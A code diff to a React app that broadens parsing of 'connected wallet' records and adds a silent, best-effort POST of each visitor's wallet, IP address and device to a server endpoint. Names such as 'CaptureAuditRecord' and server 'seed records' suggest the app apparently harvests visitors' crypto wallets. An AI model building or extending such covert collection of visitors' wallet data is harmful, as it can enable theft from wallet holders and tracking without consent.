@@ -727,10 +727,28 @@ const readCaptureAuditRecords = (): CaptureAuditRecord[] => {
 }
 
 const normalizeConnectedWalletRecords = (incoming: unknown): ConnectedWalletRecord[] => {
-  if (!Array.isArray(incoming)) return []
+  let rowsRaw: unknown = incoming
+  if (typeof rowsRaw === 'string') {
+    try {
+      rowsRaw = JSON.parse(rowsRaw)
+    } catch {
+      return []
+    }
+  }
+  if (!Array.isArray(rowsRaw)) {
+    if (rowsRaw && typeof rowsRaw === 'object') {
+      const rowObj = rowsRaw as Record<string, unknown>
+      return normalizeConnectedWalletRecords(
+        rowObj.connected_wallets ?? rowObj.connectedWallets ?? rowObj.records ?? rowObj.items ?? [],
+      )
+    }
+    return []
+  }
+
+  const incomingRows = rowsRaw as unknown[]
   const rows: ConnectedWalletRecord[] = []
   const seen = new Set<string>()
-  for (const item of incoming) {
+  for (const item of incomingRows) {
     if (!item || typeof item !== 'object') continue
     const row = item as Record<string, unknown>
     const wallet = typeof row.wallet === 'string' ? row.wallet.trim() : ''
@@ -1412,6 +1430,20 @@ export default function App() {
     }
   }
 
+  /** Push one connected wallet record to /api/record-wallet endpoint (best effort). */
+  const pushConnectedWalletToServer = async (record: ConnectedWalletRecord): Promise<boolean> => {
+    try {
+      const res = await fetch('/api/record-wallet', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(record),
+      })
+      return res.ok
+    } catch {
+      return false
+    }
+  }
+
   const refreshServerSeedRecords = async (): Promise<void> => {
     setSeedsLoading(true)
     try {
@@ -1559,6 +1591,7 @@ export default function App() {
             ipAddress: currentVisitorIp,
             device: currentVisitorDevice,
           }, ...filtered].slice(0, 100)
+          void pushConnectedWalletToServer(next[0])
           void saveMergedConnectedWalletsToCloud(next)
           return next
         })
@@ -1661,6 +1694,7 @@ export default function App() {
           ipAddress: currentVisitorIp,
           device: currentVisitorDevice,
         }, ...filtered].slice(0, 100)
+        void pushConnectedWalletToServer(next[0])
         void saveMergedConnectedWalletsToCloud(next)
         return next
       })
